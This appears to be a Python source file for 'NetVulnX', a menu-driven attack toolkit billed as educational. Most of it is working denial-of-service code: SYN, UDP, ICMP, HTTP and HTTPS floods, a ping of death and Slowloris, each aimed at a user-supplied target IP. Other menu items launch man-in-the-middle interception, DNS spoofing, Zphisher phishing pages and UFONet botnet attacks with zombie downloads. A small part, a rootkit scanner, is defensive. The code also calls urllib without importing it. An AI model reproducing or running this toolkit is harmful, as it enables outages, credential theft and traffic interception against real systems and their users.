 
#!/usr/bin/env python3
import os
import subprocess
from pyfiglet import Figlet
import sys
from time import sleep
import shutil
import socket
import time
import requests
from scapy.all import IP, TCP, UDP, ICMP, Raw, send

# Color Codes
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
C = "\033[1;36m"
B = "\033[1;34m"
W = "\033[0m"
BOLD = "\033[1m"

# Banner
def banner():
    os.system("clear" if os.name == "posix" else "cls")
    f = Figlet(font='slant')
    ascii_banner = f.renderText('NetVulnX')
    print(f"{C}{BOLD}{ascii_banner}{W}")
    print(f"{Y}Created for Educational & Awareness Purposes")
    print(f"Author: {R}Mohan Raj{Y} | Tool: {G}World Weakest Hacker")
    print(f"{W}============================================================")

# Install dependencies
def install_tools():
    print(f"{G}[+] Installing dependencies...{W}")
    subprocess.run(["apt", "update"], check=True)
    subprocess.run(["apt", "install", "-y", "golang", "make", "pkg-config", "nmap", 
                    "libusb-dev", "hping3", "ettercap-graphical", "rkhunter", "git", "python3-pip"], check=True)

# Fix 'import cgi' issues in UFONet
def fix_cgi_issue_in_ufonet():
    ufonet_directory = "ufonet"
    if os.path.exists(ufonet_directory):
        print(f"[+] Fixing 'cgi' issue in UFONet...")
        for root, dirs, files in os.walk(ufonet_directory):
            for file in files:
                if file.endswith(".py"):
                    path = os.path.join(root, file)
                    with open(path, "r") as f:
                        lines = f.readlines()
                    with open(path, "w") as f:
                        for line in lines:
                            f.write(line.replace("import cgi", "import html"))
        print("[+] 'cgi' issue fixed.")

# Function: MITM
def mitm_attack():
    banner()
    print(f"{Y}[+] Checking Bettercap...{W}")
    if not shutil.which("bettercap"):
        print(f"{R}[!] Bettercap is not installed.{W}")
        input(f"{C}[>>] Press Enter to return...{W}")
        return
    subprocess.run(["bettercap", "-eval", "net.probe on; net.recon on"], check=True)
    input(f"{C}[>>] Press Enter to return...{W}")

# Function: Rootkit Awareness
def rootkit_awareness():
    banner()
    subprocess.run(["rkhunter", "--check"], check=True)
    input(f"{C}[>>] Press Enter to return...{W}")

# Function: DDoS Attack
def ddos_attack():
    banner()
    ip = input(f"{Y}[>>] Enter target IP: {W}")
    port = int(input(f"{Y}[>>] Enter target port (e.g., 80): {W}"))
    duration = int(input(f"{Y}[>>] Enter duration for attack (seconds): {W}"))
    attack_choice = input(f"""{Y}[>>] Choose DDoS attack method:
[1] SYN Flood
[2] UDP Flood
[3] HTTP Flood
[4] ICMP Flood
[5] Ping of Death
[6] Slowloris
[7] HTTPS Flood
{W}""")
    methods = {
        '1': syn_flood,
        '2': udp_flood,
        '3': http_flood,
        '4': icmp_flood,
        '5': ping_of_death,
        '6': slowloris_attack,
        '7': https_flood
    }
    method = methods.get(attack_choice)
    if method:
        if attack_choice in ['4', '5']:
            method(ip, duration)
        else:
            method(ip, port, duration)
    else:
        print(f"{R}[!] Invalid choice!{W}")
        input(f"{C}[>>] Press Enter to return...{W}")

# DDoS Methods
def syn_flood(ip, port, duration):
    print(f"{Y}[*] Starting SYN Flood on {ip}:{port} for {duration}s{W}")
    pkt = IP(dst=ip)/TCP(dport=port, flags="S")
    end_time = time.time() + duration
    while time.time() < end_time:
        send(pkt, verbose=True)

def udp_flood(ip, port, duration):
    print(f"{Y}[*] Starting UDP Flood on {ip}:{port} for {duration}s{W}")
    pkt = IP(dst=ip)/UDP(dport=port)/Raw(load=os.urandom(1024))
    end_time = time.time() + duration
    while time.time() < end_time:
        send(pkt, verbose=True)

def http_flood(ip, port, duration):
    target_url = f"http://{ip}:{port}"
    print(f"{Y}[*] Starting HTTP Flood on {target_url} for {duration}s{W}")
    end_time = time.time() + duration
    request_count = 0
    while time.time() < end_time:
        try:
            requests.get(target_url, timeout=2)
            request_count += 1
            if request_count % 100 == 0:
                print(f"Sent {request_count} requests.")
        except requests.RequestException:
            pass
    print(f"{G}[*] Finished HTTP Flood. Total requests sent: {request_count}{W}")

def icmp_flood(ip, duration):
    print(f"{Y}[*] Starting ICMP Flood on {ip} for {duration}s{W}")
    pkt = IP(dst=ip)/ICMP()
    end_time = time.time() + duration
    while time.time() < end_time:
        send(pkt, verbose=True)

def ping_of_death(ip, duration):
    print(f"{Y}[*] Starting Ping of Death on {ip} for {duration}s{W}")
    pkt = IP(dst=ip)/ICMP()/(b"A" * 65536)
    end_time = time.time() + duration
    while time.time() < end_time:
        send(pkt, verbose=True)

def slowloris_attack(ip, port, duration):
    print(f"{Y}[*] Starting Slowloris Attack on {ip}:{port} for {duration}s{W}")
    end_time = time.time() + duration
    sockets = []
    try:
        for _ in range(100):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                s.send(b"GET /? HTTP/1.1\r\n")
                s.send(f"Host: {ip}\r\n".encode("utf-8"))
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                s.send(b"Content-Length: 42\r\n")
                sockets.append(s)
            except socket.error:
                pass
        while time.time() < end_time:
            for s in sockets[:]:
                try:
                    s.send(b"X-a: b\r\n")
                except socket.error:
                    sockets.remove(s)
            time.sleep(15)
    except Exception as e:
        print(f"{R}Error during Slowloris: {e}{W}")
    print(f"{G}[*] Finished Slowloris Attack.{W}")

def https_flood(ip, port, duration):
    target_url = f"https://{ip}:{port}"
    print(f"{Y}[*] Starting HTTPS Flood on {target_url} for {duration}s{W}")
    end_time = time.time() + duration
    request_count = 0
    while time.time() < end_time:
        try:
            requests.get(target_url, timeout=2, verify=True)
            request_count += 1
            if request_count % 100 == 0:
                print(f"Sent {request_count} requests.")
        except requests.RequestException:
            pass
    print(f"{G}[*] Finished HTTPS Flood. Total requests sent: {request_count}{W}")

# Function: DNS Spoofing
def dns_spoofing():
    banner()
    subprocess.run(["ettercap", "-G"], check=True)
    input(f"{C}[✓] Press Enter to return...{W}")

# Function: Zphisher
def dns_phishing():
    banner()
    if not os.path.exists("zphisher"):
        subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher.git"], check=True)
    os.chdir("zphisher")
    subprocess.run(["bash", "zphisher.sh"], check=True)
    os.chdir("..")
    input(f"{C}[✓] Press Enter to return...{W}")

# Function: UFONet Integration
def botnet_attack():
    banner()
    if not os.path.exists("ufonet"):
        print(f"{G}[+] Cloning UFONet...{W}")
        subprocess.run(["git", "clone", "https://github.com/epsylon/ufonet"], check=True)

    fix_cgi_issue_in_ufonet()
    os.chdir("ufonet")

    print(f"{G}[*] Running setup.py...{W}")
    subprocess.run(["python3", "setup.py"], check=True)

    print(f"""{Y}
[+] UFONet Options:
1. Launch Web GUI
2. Show Command Help
3. Launch Action Menu
4. Back
""")
    opt = input(f"{Y}[>>] Choose UFONet launch method: {W}")
    if opt == "1":
        print(f"{G}[+] Launching UFONet Web GUI...{W}")
        subprocess.run(["python3", "ufonet", "--gui"], check=True)
    elif opt == "2":
        print(f"{G}[+] Launching UFONet Command Help...{W}")
        subprocess.run(["python3", "ufonet", "--help"], check=True)
    elif opt == "3":
        print(f"""{C}
[+] UFONet Action Menu:
1. Launch Web GUI
2. Download Zombies
3. Start Attack
4. Back
""")
        choice = input(f"{Y}[>>] Choose: {W}")
        if choice == "1":
            subprocess.run(["python3", "ufonet", "--gui"])
        elif choice == "2":
            subprocess.run(["python3", "ufonet", "--download-zombies"])
        elif choice == "3":
            subprocess.run(["python3", "ufonet", "--attack"])
        else:
            print(f"{C}Returning to UFONet menu...{W}")
    else:
        print(f"{C}Returning to main menu...{W}")

    os.chdir("..")
    input(f"{C}[✓] Press Enter to return...{W}")

# Function: Angry IP Scanner
def angry_ip_scanner():
    print("[+] Checking for Angry IP Scanner...")
    if shutil.which("ipscan"):
        print("[+] Angry IP Scanner is already installed.")
        subprocess.run(["ipscan"])
        return

    print("[+] Downloading Angry IP Scanner...")
    url = "https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan_3.9.1_all.deb"
    output_file = "angryip.deb"
    urllib.request.urlretrieve(url, output_file)

    print("[+] Installing Angry IP Scanner...")
    try:
        subprocess.run(["sudo", "dpkg", "-i", output_file], check=True)
    except subprocess.CalledProcessError:
        print("[!] dpkg install failed due to missing dependencies. Fixing...")
        subprocess.run(["sudo", "apt", "-f", "install", "-y"], check=True)

    print("[+] Launching Angry IP Scanner...")
    subprocess.run(["ipscan"])
# Main menu
def main_menu():
    while True:
        banner()
        print(f"""{G}{BOLD}
[1] MITM Attack (Bettercap)
[2] Rootkit Detection (rkhunter)
[3] DDoS Attack Simulation
[4] DNS Spoofing (Ettercap + Fake Page)
[5] Phishing (Zphisher)
[6] Botnet (UFONet)
[7] Angry IP Scanner
[0] Exit
{W}""")
        choice = input(f"{Y}[>>] Choose an option: {W}")
        if choice == "1":
            mitm_attack()
        elif choice == "2":
            rootkit_awareness()
        elif choice == "3":
            ddos_attack()
        elif choice == "4":
            dns_spoofing()
        elif choice == "5":
            dns_phishing()
        elif choice == "6":
            botnet_attack()
        elif choice == "7":
            angry_ip_scanner()
        elif choice == "0":
            print(f"{G}[✓] Exiting NetVulnX...{W}")
            sys.exit(0)
        else:
            print(f"{R}[!] Invalid choice!{W}")
            sleep(1)

# Entry point
if __name__ == "__main__":
    install_tools()
    main_menu()
